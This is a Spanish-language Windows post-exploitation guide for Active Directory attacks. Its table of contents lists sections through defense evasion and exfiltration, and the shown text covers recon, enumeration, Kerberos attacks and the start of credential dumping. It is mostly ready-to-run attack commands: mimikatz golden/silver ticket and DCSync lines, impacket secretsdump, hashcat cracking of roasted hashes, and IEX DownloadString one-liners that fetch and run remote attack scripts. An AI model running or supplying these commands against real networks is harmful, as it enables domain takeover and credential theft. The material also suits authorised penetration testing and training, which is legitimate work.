## Indice

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (3556 lineas)


1. [1. Reconocimiento Inicial](#1-reconocimiento-inicial)
    - [1.1 Información del Sistema](#11-informacin-del-sistema)
    - [1.2 Usuarios y Grupos](#12-usuarios-y-grupos)
    - [1.3 Información de Red](#13-informacin-de-red)
    - [1.4 Procesos y Servicios](#14-procesos-y-servicios)
    - [1.5 Parches y Vulnerabilidades](#15-parches-y-vulnerabilidades)
    - [1.6 Archivos y Directorios Interesantes](#16-archivos-y-directorios-interesantes)
2. [2. Active Directory Enumeration](#2-active-directory-enumeration)
    - [2.1 PowerView (PowerSploit)](#21-powerview-powersploit)
    - [2.2 BloodHound](#22-bloodhound)
    - [2.3 ADExplorer (SysInternals)](#23-adexplorer-sysinternals)
    - [2.4 Enumeración Nativa (sin herramientas externas)](#24-enumeracin-nativa-sin-herramientas-externas)
3. [3. Kerberos Attacks (Advanced)](#3-kerberos-attacks-advanced)
    - [3.1 AS-REP Roasting](#31-as-rep-roasting)
    - [3.2 Kerberoasting](#32-kerberoasting)
    - [3.3 Golden Ticket](#33-golden-ticket)
    - [3.4 Silver Ticket](#34-silver-ticket)
    - [3.5 DCSync](#35-dcsync)
    - [3.6 Kerberos Unconstrained Delegation](#36-kerberos-unconstrained-delegation)
4. [4. GPP/cPassword Attack](#4-gppcpassword-attack)
5. [5. Credential Dumping (Completo)](#5-credential-dumping-completo)
    - [5.1 SAM + SYSTEM (Local Hashes)](#51-sam-system-local-hashes)
    - [5.2 LSASS Dump (Credenciales en Memoria)](#52-lsass-dump-credenciales-en-memoria)
    - [5.3 Windows Vault y Credential Manager](#53-windows-vault-y-credential-manager)
    - [5.4 DPAPI (Data Protection API)](#54-dpapi-data-protection-api)
    - [5.5 LSA Secrets](#55-lsa-secrets)
6. [6. AppLocker / Application Guard Bypass](#6-applocker-application-guard-bypass)
    - [6.1 AppLocker Bypass con Binarios Confiables](#61-applocker-bypass-con-binarios-confiables)
    - [6.2 AppLocker Bypass con Alternate Data Streams](#62-applocker-bypass-con-alternate-data-streams)
    - [6.3 AppLocker Policy Discovery](#63-applocker-policy-discovery)
7. [7. UAC Bypass](#7-uac-bypass)
    - [7.1 Fodhelper Bypass (Windows 10/11)](#71-fodhelper-bypass-windows-1011)
    - [7.2 EventVwr Bypass](#72-eventvwr-bypass)
    - [7.3 SDCLT Bypass](#73-sdclt-bypass)
    - [7.4 ComputerDefaults Bypass](#74-computerdefaults-bypass)
    - [7.5 CMSTP Bypass](#75-cmstp-bypass)
    - [7.6 DiskCleanup Bypass](#76-diskcleanup-bypass)
    - [7.7 Verificar si UAC está activo](#77-verificar-si-uac-est-activo)
8. [8. AMSI Bypass](#8-amsi-bypass)
    - [8.1 Bypass por Registry (parchear el valor)](#81-bypass-por-registry-parchear-el-valor)
    - [8.2 Bypass por Memoria (parchear AMSI.dll)](#82-bypass-por-memoria-parchear-amsidll)
    - [8.3 Bypass por Reflection (sin registry)](#83-bypass-por-reflection-sin-registry)
    - [8.4 Bypass por Obfuscation (muchas variantes)](#84-bypass-por-obfuscation-muchas-variantes)
    - [8.5 Bypass con Binarios (no-PowerShell)](#85-bypass-con-binarios-no-powershell)
9. [9. PowerShell Logging Bypass](#9-powershell-logging-bypass)
    - [9.1 ScriptBlock Logging Bypass](#91-scriptblock-logging-bypass)
    - [9.2 Module Logging Bypass](#92-module-logging-bypass)
    - [9.3 Transcription Bypass](#93-transcription-bypass)
    - [9.4 Logging Bypass Insertando String ofuscados](#94-logging-bypass-insertando-string-ofuscados)
10. [10. Windows Defender Evasion](#10-windows-defender-evasion)
    - [10.1 Deshabilitar Defender Temporalmente](#101-deshabilitar-defender-temporalmente)
    - [10.2 Agregar Exclusiones](#102-agregar-exclusiones)
    - [10.3 Deshabilitar Defender Permanentemente (Registry)](#103-deshabilitar-defender-permanentemente-registry)
    - [10.4 Parar Servicios de Seguridad](#104-parar-servicios-de-seguridad)
11. [11. WSL (Windows Subsystem for Linux) Exploitation](#11-wsl-windows-subsystem-for-linux-exploitation)
    - [11.1 Enumerar WSL](#111-enumerar-wsl)
    - [11.2 Ejecutar Comandos en WSL (desde Windows)](#112-ejecutar-comandos-en-wsl-desde-windows)
    - [11.3 Acceder a Windows desde WSL](#113-acceder-a-windows-desde-wsl)
12. [12. DLL Hijacking y Sideloading](#12-dll-hijacking-y-sideloading)
    - [12.1 Buscar DLLs Cargables](#121-buscar-dlls-cargables)
    - [12.2 Crear DLL Maliciosa](#122-crear-dll-maliciosa)
    - [12.3 DLL Sideloading (con Apps Firmadas)](#123-dll-sideloading-con-apps-firmadas)
13. [13. COM Hijacking para Persistencia](#13-com-hijacking-para-persistencia)
    - [13.1 Encontrar CLSID Hijackables](#131-encontrar-clsid-hijackables)
    - [13.2 Crear COM Hijack](#132-crear-com-hijack)
    - [13.3 COM Hijack con Event Handler](#133-com-hijack-con-event-handler)
14. [14. ADCS (Active Directory Certificate Services) Attacks](#14-adcs-active-directory-certificate-services-attacks)
    - [14.1 Encontrar ADCS](#141-encontrar-adcs)
    - [14.2 ESC1 — Template Misconfiguration (SAN)](#142-esc1-template-misconfiguration-san)
    - [14.3 ESC2 — Template Any Purpose Key Usage](#143-esc2-template-any-purpose-key-usage)
    - [14.4 ESC3 — Enrollment Agent Templates](#144-esc3-enrollment-agent-templates)
    - [14.5 ESC4 — Template ACL Misconfiguration](#145-esc4-template-acl-misconfiguration)
    - [14.6 ESC5 — CA ACL Misconfiguration](#146-esc5-ca-acl-misconfiguration)
    - [14.7 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2](#147-esc6-editfattributesubjectaltname2)
    - [14.8 ESC7 — CA Access Control Vulnerable](#148-esc7-ca-access-control-vulnerable)
    - [14.9 ESC8 — NTLM Relay to AD CS Web Enrollment](#149-esc8-ntlm-relay-to-ad-cs-web-enrollment)
15. [15. NTLM Relay Attacks](#15-ntlm-relay-attacks)
    - [15.1 SMB Relay](#151-smb-relay)
    - [15.2 SMB Relay con SMB Signing Disabled](#152-smb-relay-con-smb-signing-disabled)
    - [15.3 HTTP Relay](#153-http-relay)
16. [16. Printer Bug (MS-RPRN)](#16-printer-bug-ms-rprn)
    - [16.1 Coerción con SpoolSample](#161-coercin-con-spoolsample)
    - [16.2 Capturar Autenticación](#162-capturar-autenticacin)
17. [17. Delegation Abuse](#17-delegation-abuse)
    - [17.1 Unconstrained Delegation](#171-unconstrained-delegation)
    - [17.2 Constrained Delegation Abuse](#172-constrained-delegation-abuse)
    - [17.3 Resource-Based Constrained Delegation (RBCD)](#173-resource-based-constrained-delegation-rbcd)
18. [18. GPO Persistence](#18-gpo-persistence)
    - [18.1 Agregar Startup Script a GPO](#181-agregar-startup-script-a-gpo)
    - [18.2 Editar GPO Existente (PowerShell)](#182-editar-gpo-existente-powershell)
19. [19. Domain Trust Attacks](#19-domain-trust-attacks)
    - [19.1 Enumerar Trusts](#191-enumerar-trusts)
    - [19.2 SID History Abuse (Extraer SID de otro dominio)](#192-sid-history-abuse-extraer-sid-de-otro-dominio)
    - [19.3 Cross-Kerberos Trust Abuse](#193-cross-kerberos-trust-abuse)
20. [20. Machine Account Quota Abuse](#20-machine-account-quota-abuse)
21. [21. SMB Relay con Impacket](#21-smb-relay-con-impacket)
    - [21.1 SMB Relay Básico](#211-smb-relay-bsico)
    - [21.2 SMB Relay con Socks](#212-smb-relay-con-socks)
22. [22. Lateral Movement (Completo)](#22-lateral-movement-completo)
    - [22.1 PsExec](#221-psexec)
    - [22.2 WMI (Windows Management Instrumentation)](#222-wmi-windows-management-instrumentation)
    - [22.3 WinRM (Windows Remote Management)](#223-winrm-windows-remote-management)
    - [22.4 DCOM (Distributed COM)](#224-dcom-distributed-com)
    - [22.5 SCCM (System Center Configuration Manager)](#225-sccm-system-center-configuration-manager)
    - [22.6 Schtasks Remoto](#226-schtasks-remoto)
23. [23. RDP Session Hijacking](#23-rdp-session-hijacking)
    - [23.1 Conectar a Sesión Existente](#231-conectar-a-sesin-existente)
    - [23.2 Habilitar RDP en Máquina Remota](#232-habilitar-rdp-en-mquina-remota)
24. [24. Pass-the-Hash / Pass-the-Ticket / Overpass-the-Hash](#24-pass-the-hash-pass-the-ticket-overpass-the-hash)
    - [24.1 Pass-the-Hash](#241-pass-the-hash)
    - [24.2 Pass-the-Ticket](#242-pass-the-ticket)
    - [24.3 Overpass-the-Hash (NTLM → Kerberos)](#243-overpass-the-hash-ntlm-kerberos)
25. [25. Token Manipulation](#25-token-manipulation)
    - [25.1 Token Impersonation con Incognito](#251-token-impersonation-con-incognito)
    - [25.2 Token Duplication con PowerShell](#252-token-duplication-con-powershell)
26. [26. Privilege Escalation — Escalada de Privilegios](#26-privilege-escalation-escalada-de-privilegios)
    - [26.1 Kernel Exploits](#261-kernel-exploits)
    - [26.2 Service Misconfigurations](#262-service-misconfigurations)
    - [26.3 AlwaysInstallElevated](#263-alwaysinstallelevated)
    - [26.4 Unquoted Service Paths](#264-unquoted-service-paths)
    - [26.5 Token Impersonation (SeImpersonatePrivilege)](#265-token-impersonation-seimpersonateprivilege)
27. [27. Persistencia (Métodos Avanzados)](#27-persistencia-mtodos-avanzados)
    - [27.1 Startup Folder](#271-startup-folder)
    - [27.2 Registry Run Keys](#272-registry-run-keys)
    - [27.3 Scheduled Tasks](#273-scheduled-tasks)
    - [27.4 Service Persistence](#274-service-persistence)
    - [27.5 WMI Event Subscription](#275-wmi-event-subscription)
    - [27.6 Bootkit (Boot Configuration)](#276-bootkit-boot-configuration)
    - [27.7 COM / DLL Hijacking (Persistente)](#277-com-dll-hijacking-persistente)
28. [28. Exfiltración de Datos](#28-exfiltracin-de-datos)
    - [28.1 Compresión](#281-compresin)
    - [28.2 Exfiltración por Protocolos](#282-exfiltracin-por-protocolos)
29. [29. Herramientas Indispensables (Carga Rápida)](#29-herramientas-indispensables-carga-rpida)
30. [30. AD CS — Guía Completa ESC1 a ESC13](#30-ad-cs-gua-completa-esc1-a-esc13)
    - [30.1 ESC1 — Subject Alternative Name (SAN) Abuse](#301-esc1-subject-alternative-name-san-abuse)
    - [30.2 ESC2 — Any Purpose Key Usage](#302-esc2-any-purpose-key-usage)
    - [30.3 ESC3 — Enrollment Agent Templates](#303-esc3-enrollment-agent-templates)
    - [30.4 ESC4 — Template ACL Misconfiguration](#304-esc4-template-acl-misconfiguration)
    - [30.5 ESC5 — CA ACL Misconfiguration](#305-esc5-ca-acl-misconfiguration)
    - [30.6 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2](#306-esc6-editfattributesubjectaltname2)
    - [30.7 ESC7 — CA Access Control Vulnerable (Manager Approval)](#307-esc7-ca-access-control-vulnerable-manager-approval)
    - [30.8 ESC8 — NTLM Relay to AD CS Web Enrollment](#308-esc8-ntlm-relay-to-ad-cs-web-enrollment)
    - [30.9 ESC9 — No Security Extension (MS-DRM)](#309-esc9-no-security-extension-ms-drm)
    - [30.10 ESC10 — Weak Certificate Request Agent Authentication](#3010-esc10-weak-certificate-request-agent-authentication)
    - [30.11 ESC11 — RPC Relay to AD CS (ICERTPASS)](#3011-esc11-rpc-relay-to-ad-cs-icertpass)
    - [30.12 ESC12 — Shell Access via AD CS](#3012-esc12-shell-access-via-ad-cs)
    - [30.13 ESC13 — Domain Escalation via CA](#3013-esc13-domain-escalation-via-ca)
    - [30.14 Key Archival Retrieval](#3014-key-archival-retrieval)
    - [30.15 NTDSUtil — Extraer Hashes de la CA](#3015-ntdsutil-extraer-hashes-de-la-ca)
31. [31. PKI Infrastructure Attacks — Ataques Completos a Infraestructura PKI](#31-pki-infrastructure-attacks-ataques-completos-a-infraestructura-pki)
    - [31.1 CA Compromise (Compromiso de la Autoridad Certificadora)](#311-ca-compromise-compromiso-de-la-autoridad-certificadora)
    - [31.2 Certificate Template Abuse (Abuso de Plantillas)](#312-certificate-template-abuse-abuso-de-plantillas)
    - [31.3 Enrollee-Supplied SAN (SAN por el Solicitante)](#313-enrollee-supplied-san-san-por-el-solicitante)
    - [31.4 Key Archival Retrieval (Recuperación de Claves Archivadas)](#314-key-archival-retrieval-recuperacin-de-claves-archivadas)
32. [32. Domain Controller Attacks — Ataques Avanzados a DCs](#32-domain-controller-attacks-ataques-avanzados-a-dcs)
    - [32.1 NTDS.dit Extraction Methods](#321-ntdsdit-extraction-methods)
    - [32.2 Secretsdump con DRSUAPI (DCSync Style)](#322-secretsdump-con-drsuapi-dcsync-style)
    - [32.3 USN Journal Parsing (Update Sequence Number)](#323-usn-journal-parsing-update-sequence-number)
    - [32.4 AD Recycle Bin Enumeration](#324-ad-recycle-bin-enumeration)
33. [33. Microsoft Entra ID (Azure AD) Attacks](#33-microsoft-entra-id-azure-ad-attacks)
    - [33.1 Token Theft — Azure AD Access & Refresh Tokens](#331-token-theft-azure-ad-access-refresh-tokens)
    - [33.2 PRT (Primary Refresh Token) Abuse](#332-prt-primary-refresh-token-abuse)
    - [33.3 Seamless SSO Exploitation](#333-seamless-sso-exploitation)
    - [33.4 Password Hash Sync (PHS) Extraction](#334-password-hash-sync-phs-extraction)
    - [33.5 ADFS Token Signing Certificate Theft](#335-adfs-token-signing-certificate-theft)
    - [33.6 Cloud Kerberos Trust Abuse](#336-cloud-kerberos-trust-abuse)
34. [34. Windows Hello for Business Attacks](#34-windows-hello-for-business-attacks)
    - [34.1 PIN Cracking (NGC Key Cracking)](#341-pin-cracking-ngc-key-cracking)
    - [34.2 TPM Key Extraction](#342-tpm-key-extraction)
    - [34.3 NGC Key Abuse](#343-ngc-key-abuse)
35. [35. Microsoft 365 Attacks](#35-microsoft-365-attacks)
    - [35.1 Exchange Online Token Theft](#351-exchange-online-token-theft)
    - [35.2 SharePoint Online Token Theft](#352-sharepoint-online-token-theft)
    - [35.3 Teams Token Theft](#353-teams-token-theft)
    - [35.4 OneDrive Data Exfiltration](#354-onedrive-data-exfiltration)
36. [36. BloodHound Advanced — Queries y Automatización](#36-bloodhound-advanced-queries-y-automatizacin)
    - [36.1 Custom Cypher Queries](#361-custom-cypher-queries)
    - [36.2 BloodHound CE New Features](#362-bloodhound-ce-new-features)
    - [36.3 Custom BloodHound Collectors](#363-custom-bloodhound-collectors)
    - [36.4 BloodHound Automation with Python](#364-bloodhound-automation-with-python)
37. [37. Defender for Endpoint Evasion (Completo)](#37-defender-for-endpoint-evasion-completo)
    - [37.1 AMSI Bypass Avanzados](#371-amsi-bypass-avanzados)
    - [37.2 Defender Evasion — Exclusiones y Deshabilitación](#372-defender-evasion-exclusiones-y-deshabilitacin)
    - [37.3 ASR Rule Bypass (Attack Surface Reduction)](#373-asr-rule-bypass-attack-surface-reduction)
    - [37.4 Microsoft 365 Defender Evasion](#374-microsoft-365-defender-evasion)
    - [37.5 VBS (Virtualization-Based Security) Bypass](#375-vbs-virtualization-based-security-bypass)
    - [37.6 HVCI (Hypervisor-Protected Code Integrity) Bypass](#376-hvci-hypervisor-protected-code-integrity-bypass)
    - [37.7 Secure Launch / System Guard](#377-secure-launch-system-guard)
38. [38. GUI Automation para Escalada de Privilegios (UIAccess Bypass)](#38-gui-automation-para-escalada-de-privilegios-uiaccess-bypass)
    - [38.1 UIAccess (UI Access) Bypass](#381-uiaccess-ui-access-bypass)
    - [38.2 Interactive Window Station Attacks](#382-interactive-window-station-attacks)
    - [38.3 Session 0 Isolation Issues](#383-session-0-isolation-issues)
    - [38.4 GUI-Based UAC Bypass — Lista Completa](#384-gui-based-uac-bypass-lista-completa)
    - [38.5 UAC Level Bypass (ConsentPromptBehaviorAdmin)](#385-uac-level-bypass-consentpromptbehavioradmin)
39. [39. Referencias y Recursos](#39-referencias-y-recursos)

---

# Post-Explotación Windows — Guía Completa

Guía de post-explotación en entornos Windows. Cubre desde enumeración inicial hasta movimientos laterales complejos, [escalada de privilegios](../raw/l1n9x-pr1v3sc.md), [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia), ataques [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md) y evasión de defensas. Todo en argentino, pasito a pasito.

---

## 1. [reconocimiento](../raw/0s1nt.md#reconocimiento) Inicial

Cuando recién ganás acceso a un host Windows, lo primero es entender qué tenés entre manos: versión, usuarios, [red](../raw/r3d3s-f0nd4m3nt0s.md), servicios, parches.

### 1.1 Información del Sistema

```cmd
# Versión del SO, arquitectura, service pack
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Total Physical Memory" /C:"Domain" /C:"Hotfix"

# Hostname y dominio
hostname
echo %computername%
wmic computersystem get domain,name,manufacturer,model

# Variables de entorno
set
echo %PATH%
echo %USERDOMAIN%

# Arquitectura
wmic os get osarchitecture

# Build number (útil para exploits específicos)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild
```

### 1.2 Usuarios y Grupos

```cmd
# Quién soy
whoami
whoami /all                    # Privilegios, grupos, SIDs, capabilities
whoami /priv                   # Solo privilegios
whoami /groups                 # Solo grupos
whoami /user                   # SID del usuario

# Listar todos los usuarios
net user
net user %username%

# Grupos locales
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"
net localgroup "Backup Operators"

# Usuarios del dominio (si está en AD)
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# SID del dominio
wmic useraccount get name,sid
```

### 1.3 Información de Red

```cmd
# Interfaces IP
ipconfig /all
wmic nicconfig get ipaddress,ipsubnet,defaultipgateway,macaddress

# Conexiones activas
netstat -ano
netstat -ano | findstr LISTEN
netstat -ano | findstr ESTABLISHED
netstat -bano | more            # Con binarios (necesita admin)

# Tabla de ruteo
route print

# Tabla ARP (qué máquinas están hablando con esta)
arp -a

# DNS cache
ipconfig /displaydns

# Conexiones SMB
net view
net view /domain
net share

# Conexiones RDP
qwinsta
query user
```

### 1.4 Procesos y Servicios

```cmd
# Listar procesos
tasklist
tasklist /v                      # Verboso (usuario, sesión)
tasklist /svc                    # Servicios por proceso
tasklist /fi "pid eq 1234"       # Filtrar por PID

# Procesos con WMI
wmic process get name,processid,executablepath,commandline

# Servicios
wmic service get name,displayname,pathname,startname,startmode
sc query
sc queryex state= all

# Programas instalados
wmic product get name,version,vendor
dir /b "C:\Program Files"
dir /b "C:\Program Files (x86)"

# Drivers instalados
wmic sysdriver get name,startmode,pathname
```

### 1.5 Parches y Vulnerabilidades

```cmd
# Listar hotfixes instalados
wmic qfe list brief /format:table
wmic qfe get Caption,Description,HotFixID,InstalledOn
systeminfo | findstr KB

# Listar actualizaciones con PowerShell
powershell "Get-HotFix | Format-Table"
powershell "Get-HotFix | Where-Object {$_.InstalledOn -gt '2024-01-01'}"

# Buscar parches faltantes conocidos
# Después de guardar systeminfo, pasarlo por Windows-Exploit-Suggester
systeminfo > sysinfo.txt
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt

# Quick wins: parches para MS17-010 (EternalBlue), MS08-067
wmic qfe get HotFixID | findstr "KB4012598 KB4012212 KB4012216"
```

### 1.6 Archivos y Directorios Interesantes

```cmd
# Archivos de configuración
dir /s *.config 2>nul
dir /s *.xml 2>nul | findstr "web.config app.config"
dir /s *.txt 2>nul | findstr "password credencial"

# Historial de comandos
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Archivos recientes
dir /od /t:w %userprofile%\Desktop\
dir /od /t:w %userprofile%\Downloads\

# Buscar archivos con contraseñas en el nombre
dir /s *pass* *cred* *secret* 2>nul

# Accesos directos (LNK) recientes
dir %appdata%\Microsoft\Windows\Recent\

# Buscar archivos en C:\ (rápido pero ruidoso)
dir C:\*pass*.txt /s
```

---

## 2. [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md) Enumeration

Si el host está en un dominio, tenés que mapear el [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) lo más rápido posible.

### 2.1 PowerView (PowerSploit)

```powershell
# Cargar PowerView
powershell -exec bypass
Import-Module .\PowerView.ps1
# O desde memoria:
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Dominio y DCs
Get-NetDomain
Get-NetDomainController

# Usuarios del dominio
Get-NetUser
Get-NetUser -Username admin
Get-NetUser | select samaccountname,description,pwdlastset,lastlogontimestamp,memberof
Get-NetUser -SPN                               # Todos los SPNs (Kerberoast)
Get-NetUser -PreauthNotRequired                # AS-REP Roastable

# Grupos
Get-NetGroup
Get-NetGroup -GroupName "Domain Admins"
Get-NetGroupMember -GroupName "Enterprise Admins"

# Computadoras
Get-NetComputer
Get-NetComputer -OperatingSystem "*Server*"
Get-NetComputer -Ping                          # Solo las que responden

# GPOs
Get-NetGPO
Get-NetGPO -ComputerName TARGET-PC

# Permisos
Get-ObjectAcl -SamAccountName admin -ResolveGUIDs
Get-NetOU -FullData

# Domain trusts
Get-NetDomainTrust
Get-NetForestTrust

# Shares
Invoke-ShareFinder
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
```

### 2.2 [bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound)

BloodHound mapea relationship entre objetos del AD para encontrar rutas de ataque visualmente.

```powershell
# Lado víctima - SharpHound (collector)
# En cmd/powershell:
SharpHound.exe -c All                    # Recolectar todo
SharpHound.exe -c Group,LocalAdmin,ACL   # Solo lo esencial
SharpHound.exe -d dominio.com -c All     # Dominio específico

# PowerShell version
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod Group,LocalAdmin,ACL -OutputDirectory C:\Temp\

# Salida: archivos .json en formato zip

# Lado atacante - BloodHound (GUI)
# 1. Levantar neo4j:
neo4j console

# 2. Arrancar BloodHound:
bloodhound

# 3. Arrastrar los .zip a la GUI

# Queries útiles en BloodHound:
# - Find all Domain Admins
# - Shortest paths to Domain Admins from owned principals
# - Kerberos delegation abuse
# - ACL abuse
# - Users with high risk privileges
# - Computers with Unconstrained Delegation
```

### 2.3 ADExplorer (SysInternals)

```cmd
# Ejecutar en máquina unida al dominio
# Interfaz gráfica similar al AD Users and Computers pero más potente
adexplorer64.exe

# Conectarse a un DC específico
adexplorer64.exe --connect DC.dominio.com
```

### 2.4 Enumeración Nativa (sin herramientas externas)

```cmd
# Usando net commands
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net accounts /domain
net user /domain

# Usando PowerShell cmdlets nativos (si corré en Windows 10/11 con RSAT)
powershell -c "Get-ADUser -Filter * -Properties *"
powershell -c "Get-ADGroup -Filter *"
powershell -c "Get-ADComputer -Filter *"
powershell -c "Get-ADDomain | fl *"

# ADSI (no necesita RSAT)
powershell -c "([ADSISearcher]'(samaccounttype=805306368)').FindAll() | % { $_.Properties }"
```

---

## 3. Kerberos Attacks (Advanced)

### 3.1 [as-rep roasting](../raw/w1nd0ws-d0m41n-4dm1n.md#as-rep-roasting)

Usuarios sin preautenticación Kerberos. Pedís un TGT directamente:

```powershell
# Con PowerView
Get-DomainUser -PreauthNotRequired
Get-NetUser -PreauthNotRequired

# Con impacket (desde Linux)
impacket-GetNPUsers -dc-ip 192.168.1.100 dominio.com/ -usersfile users.txt
impacket-GetNPUsers -dc-ip 192.168.1.100 -request dominio.com/usuario:password

# Crackear AS-REP hash con hashcat (modo 18200)
hashcat -m 18200 asrep_hash.txt rockyou.txt
```

### 3.2 [kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting)

Pedís tickets TGS para servicios SPN:

```powershell
# Con PowerView
Request-SPNTicket -User "SQLSvc"
Get-DomainUser -SPN
# O directamente:
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat hashcat | fl

# Con impacket (desde Linux)
impacket-GetUserSPNs -dc-ip 192.168.1.100 dominio.com/usuario:password -request -outputfile kerb.txt

# Crackear con hashcat (modo 13100)
hashcat -m 13100 kerb.txt rockyou.txt

# Kerberoasting con RC4 (forzar tipo de cifrado débil)
# Si podés modificar propiedades del usuario:
Set-ADUser -Identity SQLSvc -KerberosEncryptionType RC4
```

### 3.3 [golden ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#golden-ticket)

Creás un TGT falso. Necesitás el [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) del KRBTGT y el SID del dominio:

```cmd
# 1. Extraer hash KRBTGT (Mimikatz en DC - necesitás privilegios de admin en el DC)
mimikatz # lsadump::lsa /patch /user:krbtgt

# 2. Golden Ticket
mimikatz # kerberos::golden /user:Administrador /domain:dominio.com /sid:S-1-5-21-... /krbtgt:HASH_KRBTGT /id:500 /ptt

# 3. Verificar
klist
dir \\DC.dominio.com\c$
dir \\SERVER.dominio.com\c$

# Con grupos custom
mimikatz # kerberos::golden /user:Admin /domain:dominio.com /sid:S-1-5-21-... /groups:512,518,519 /krbtgt:HASH_KRBTGT /ptt

# Golden ticket con duración personalizada
mimikatz # kerberos::golden /user:Admin /domain:dominio.com /sid:... /krbtgt:... /endin:365 /renewmax:365 /ptt

# Desde Linux con impacket
impacket-ticketer -nthashes HASH_KRBTGT -domain-sid S-1-5-21-... -domain dominio.com Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dominio.com/admin@DC.dominio.com
```

### 3.4 [silver ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#silver-ticket)

Creás un ticket para un servicio específico (más sigiloso que Golden):

```cmd
# Obtener hash de la cuenta del servicio (ej: DC$)
mimikatz # lsadump::lsa /patch /user:DC$

# Crear Silver Ticket para CIFS (acceso a archivos)
mimikatz # kerberos::golden /user:Admin /domain:dominio.com /sid:S-1-5-21-... /target:DC.dominio.com /service:CIFS /rc4:HASH_DC /ptt

# Probar
dir \\DC.dominio.com\c$

# Servicios comunes:
# CIFS:   SMB (archivos compartidos)
# HOST:   Schedule tasks, WMI
# HTTP:   IIS
# MSSQLSvc: SQL Server
# LDAP:   Consultas LDAP
# RPCSS:  RPC
# WINRM:  WinRM (PowerShell remoto)
# TIME:   Time service
# EVENTLOG: Logs

# Silver para WinRM
mimikatz # kerberos::golden /user:Admin /domain:dominio.com /sid:... /target:DC.dominio.com /service:HTTP /rc4:... /ptt
mimikatz # kerberos::golden /user:Admin /domain:dominio.com /sid:... /target:DC.dominio.com /service:WSMAN /rc4:... /ptt
Enter-PSSession -ComputerName DC.dominio.com
```

### 3.5 [dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync)

Simulás replicación DC para obtener hashes:

```cmd
# Mimikatz (admin en máquina unida al dominio)
mimikatz # lsadump::dcsync /domain:dominio.com /user:Administrador
mimikatz # lsadump::dcsync /domain:dominio.com /user:krbtgt
mimikatz # lsadump::dcsync /domain:dominio.com /all /csv

# DCSync con impacket
impacket-secretsdump -just-dc-user Administrador dominio.com/admin:Pass123@192.168.1.100
impacket-secretsdump -just-dc dominio.com/admin:Pass123@192.168.1.100

# DCSync con hashes (pass-the-hash + DCSync)
impacket-secretsdump -hashes :NTHASH dominio.com/admin@192.168.1.100

# DCSync sin ser admin del dominio (con permisos de replicación)
# Necesitás: "Replicating Directory Changes" + "Replicating Directory Changes All"
# Normalmente solo DCs, pero podés darlos con ACL abuse
```

### 3.6 Kerberos Unconstrained Delegation

Máquinas con unconstrained delegation permiten que el servidor delegue al usuario a cualquier otro servicio. Si comprometés el servidor, obtenés los tickets de todos los que se conectan:

```cmd
# Encontrar computadoras con unconstrained delegation
# PowerView:
Get-NetComputer -Unconstrained -Properties dnshostname,samaccountname

# ADSI:
powershell -c "Get-ADComputer -Filter {TrustedForDelegation -eq $true}"

# En la máquina con delegación (esperar a que un admin se conecte)
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::tickets /export

# Si ves un ticket de admin, lo importás:
mimikatz # kerberos::ptt ticket.kirbi
```

---

## 4. GPP/cPassword Attack

Los GPP ([group policy](../raw/w1nd0ws-d0m41n-4dm1n.md#group-policy) Preferences) pueden contener contraseñas cifradas (mal) en SYSVOL. Microsoft publicó la clave de [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) [aes](../raw/crypt0-f0r-h4ck3rs.md#aes):

```cmd
# Buscar archivos Groups.xml en SYSVOL
dir /s \\dominio.com\SYSVOL\*.xml 2>nul
findstr /i "cpassword" \\dominio.com\SYSVOL\*.xml

# Si encontrás un cpassword, descifrarlo:
# Con PowerShell:
powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1'); Get-GPPPassword"

# Con herramientas de Kali:
gpp-decrypt "5BpQhT1zX2H8zJ7K9L0M3N4P6R7S8T9V"

# Con crackmapexec
crackmapexec smb 192.168.1.100 -u user -p pass -M gpp

# Buscar archivos XML con cpassword:
# Groups.xml, Services.xml, ScheduledTasks.xml, Printers.xml, Drives.xml, DataSources.xml
```

---

## 5. Credential Dumping (Completo)

### 5.1 SAM + SYSTEM (Local Hashes)

```cmd
# Guardar SAM y SYSTEM del registro
reg save hklm\sam C:\Temp\sam.save
reg save hklm\system C:\Temp\system.save

# Transferir a máquina atacante y extraer
impacket-secretsdump -sam sam.save -system system.save LOCAL

# También funciona:
reg save hklm\security C:\Temp\security.save  # LSA Secrets

# Con crackmapexec (remoto, necesita admin)
crackmapexec smb 192.168.1.100 -u admin -p Pass123 --sam
```

### 5.2 LSASS Dump (Credenciales en Memoria)

Las contraseñas de usuarios logueados están en la memoria de LSASS:

```cmd
# Mimikatz (recomendado)
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets
